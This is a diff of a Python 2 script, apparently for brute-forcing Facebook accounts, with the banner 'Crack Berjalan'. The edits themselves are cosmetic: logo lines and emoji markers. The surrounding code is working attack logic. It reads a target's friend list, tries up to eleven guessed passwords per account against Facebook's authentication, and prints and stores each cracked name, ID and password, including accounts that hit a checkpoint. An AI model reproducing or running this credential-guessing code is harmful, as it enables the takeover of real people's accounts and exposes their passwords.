@@ -59,18 +59,12 @@ def jalan(z):
 		
 #########LOGO#########
 logo = """
-\033[1;34m◆━━━◆♤◆━━━◆◆━━━◆♤◆━━━◆━━━◆
-PANGLIMA PERANG KAMVRET MILITAN
-◆━━━◆♤◆━━━◆◆━━━◆♤◆━━━◆━━━◆
-\33[31;1m_____      _____     ____  __.   _____     ______________________________ 
+\33[1;33m_____      _____     ____  __.   _____     ______________________________ 
   /  _  \    /  _  \   |    |/ _|  /  _  \   /   _____/\_   _____/\______   \
  /  /_\  \  /  /_\  \  |      <   /  /_\  \  \_____  \  |    __)_  |     ___/
-\33[37;1m/    |    \/    |    \ |    |  \ /    |    \ /        \ |        \ |    |    
+/    |    \/    |    \ |    |  \ /    |    \ /        \ |        \ |    |    
 \____|__  /\____|__  / |____|__ \\____|__  //_______  //_______  / |____|    
-        \/         \/          \/        \/         \/         \/
-\033[1;34m◆━━━◆♤◆━━━◆◆━━━◆♤◆━━━◆━━━◆
-IAN DEWA SULTAN PRAWIRA
-◆━━━◆♤◆━━━◆◆━━━◆♤◆━━━◆━━━◆                      
+        \/         \/          \/        \/         \/         \/                      
                                        
 \033[37;1mAuthor   : https://github.com/44k453p
 \033[37;1mRecode   : IAN DEWA SULTAN PRAWIRA
@@ -329,7 +323,7 @@ def pilih_indo():
 		print logo
 		print "\033[1;31;1m████████████████████████████████████████████████"
 		print "\033[37;1m████████████████████████████████████████████████"
-		idt = raw_input("\033[1;97m{\033[1;34m🍓\033[1;97m} ID publik/teman : ")
+	        idt = raw_input("\033[1;97m{\033[1;34m🍓\033[1;97m} ID publik/teman : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -371,6 +365,7 @@ def pilih_indo():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97m{\033[1;93m🍓\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
+
 	print "\n\033[1;31;1m████████████████████████████████████████████████"
 	print "\n\033[37;1m████████████████████████████████████████████████"
 	
@@ -391,7 +386,7 @@ def pilih_indo():
 			if 'access_token' in w:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 				z = json.loads(x.text)
-				print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+				print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 				print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 				print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
 				print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mPassword \x1c\033[1;91m🍏 \x1c\033[1;92m' + pass1 + '\n'
@@ -399,7 +394,7 @@ def pilih_indo():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in w['error_msg']:
-					print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+					print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass1 + '\n'
@@ -415,7 +410,7 @@ def pilih_indo():
 					if 'access_token' in w:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 						z = json.loads(x.text)
-						print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+						print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
 						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mPassword \x1c\033[1;91m🍏 \x1c\033[1;92m' + pass2 + '\n'
@@ -423,7 +418,7 @@ def pilih_indo():
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in w['error_msg']:
-							print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+							print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass2 + '\n'
@@ -439,7 +434,7 @@ def pilih_indo():
 							if 'access_token' in w:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 								z = json.loads(x.text)
-								print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+								print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
 								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mPassword \x1c\033[1;91m🍏 \x1c\033[1;92m' + pass3 + '\n'
@@ -447,7 +442,7 @@ def pilih_indo():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in w['error_msg']:
-									print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+									print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass3 + '\n'
@@ -463,7 +458,7 @@ def pilih_indo():
 									if 'access_token' in w:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 										z = json.loads(x.text)
-										print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+										print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
 										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass4 + '\n'
@@ -471,7 +466,7 @@ def pilih_indo():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in w['error_msg']:
-											print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+											print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 											print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 											print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 											print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass4 + '\n'
@@ -487,7 +482,7 @@ def pilih_indo():
 											if 'access_token' in w:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 												z = json.loads(x.text)
-												print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+												print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 												print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 												print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
 												print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass5 + '\n'
@@ -495,7 +490,7 @@ def pilih_indo():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in w['error_msg']:
-													print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+													print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 													print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 													print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍈 \x1c\033[1;95m' + user
 													print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass5 + '\n'
@@ -511,7 +506,7 @@ def pilih_indo():
 													if 'access_token' in w:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 														z = json.loads(x.text)
-														print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+														print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 														print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 														print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
 														print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass6 + '\n'
@@ -519,7 +514,7 @@ def pilih_indo():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in w['error_msg']:
-															print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+															print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 															print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 															print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 															print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass6 + '\n'
@@ -535,7 +530,7 @@ def pilih_indo():
 															if 'access_token' in w:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																z = json.loads(x.text)
-																print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+																print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 																print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 																print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass7 + '\n'
@@ -543,7 +538,7 @@ def pilih_indo():
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in w['error_msg']:
-																	print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+																	print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 																	print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 																	print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																	print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass7 + '\n'
@@ -559,7 +554,7 @@ def pilih_indo():
 																	if 'access_token' in w:
 																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																		z = json.loads(x.text)
-																		print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+																		print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 																		print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 																		print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																		print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass8 + '\n'
@@ -567,7 +562,7 @@ def pilih_indo():
 																		oks.append(user+pass8)
 																	else:
 																		if 'www.facebook.com' in w['error_msg']:
-																			print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+																			print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 																			print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 																			print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																			print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass8 + '\n'
@@ -583,7 +578,7 @@ def pilih_indo():
 																				if 'access_token' in w:
 																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																					z = json.loads(x.text)
-																					print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+																					print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 																					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 																					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass9 + '\n'
@@ -591,7 +586,7 @@ def pilih_indo():
 																					oks.append(user+pass9)
 																				else:
 																					if 'www.facebook.com' in w['error_msg']:
-																						print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+																						print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 																						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 																						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass9 + '\n'
@@ -607,7 +602,7 @@ def pilih_indo():
 																						if 'access_token' in w:
 																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																							z = json.loads(x.text)
-																							print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+																							print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 																							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 																							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass10 + '\n'
@@ -615,7 +610,7 @@ def pilih_indo():
 																							oks.append(user+pass10)
 																						else:
 																							if 'www.facebook.com' in w['error_msg']:
-																								print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+																								print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 																								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 																								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass10 + '\n'
@@ -631,7 +626,7 @@ def pilih_indo():
 																								if 'access_token' in w:
 																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																									z = json.loads(x.text)
-																									print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
+																									print '\x1c\033[1;94m[•✔•] \x1c\033[1;92mHack100%🍁'
 																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
 																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass11 + '\n'
@@ -639,7 +634,7 @@ def pilih_indo():
 																									oks.append(user+pass11)
 																								else:
 																									if 'www.facebook.com' in w['error_msg']:
-																										print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
+																										print '\x1c\033[1;94m[•✖•] \x1c\033[1;94mCheckpoint'
 																										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
 																										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
 																										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass11 + '\n'
